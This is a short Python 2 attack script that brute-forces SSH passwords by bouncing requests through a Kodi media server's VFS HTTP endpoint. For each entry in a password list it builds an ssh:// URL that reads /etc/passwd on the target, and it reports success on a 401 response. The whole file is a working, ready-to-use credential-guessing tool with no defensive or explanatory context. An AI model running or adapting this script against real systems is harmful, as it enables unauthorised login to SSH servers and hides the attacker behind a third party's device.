import optparse
import requests

def create_url(target, host, username, password):
    return "http://" + host + '/vfs/ssh://' + username + ':' + password + '@' + target + ':/etc/passwd'

if __name__=="__main__":
    parser = optparse.OptionParser("usage: %prog -k [kodi host] -t [target] -u [username] -p [passwordlist]")
    parser.add_option("-k", "--kodi-host", dest="host", type="string", help="A Kodi host to bounce off of")
    parser.add_option("-t", "--target", dest="target", type="string", help="The target ssh server")
    parser.add_option("-u", "--user", dest="user", type="string", help="The user to login as")
    parser.add_option("-p", "--password-list", dest="passwords", type="string", help="A file containing passwords to attempt")

    (options, args) = parser.parse_args()

    if options.host == None or options.target == None or options.user == None or options.passwords == None:
        print '[-] Host and target must be provided. For example: '
        print '\tpython kodi_ssh_brute_force.py -t 192.168.1.198 -k 192.168.1.40:8080 -u albinolobster -p /home/albinolobster/passwords.txt'
        exit(0)

    password_list = ''
    with open(options.passwords) as passwords:
        password_list = passwords.readlines()

    i = 1
    for password in password_list:
        password = password.strip()
        request = create_url(options.target, options.host, options.user, password)
        print "[+] Sending attempt " + str(i) + " of " + str(len(password_list))
        ssh_request = requests.get(request)
        if ssh_request.status_code == 401:
            print "[+] Success! The password is " + password
            exit(0)
        i = i + 1

    print "[-] Failed to guess the password"
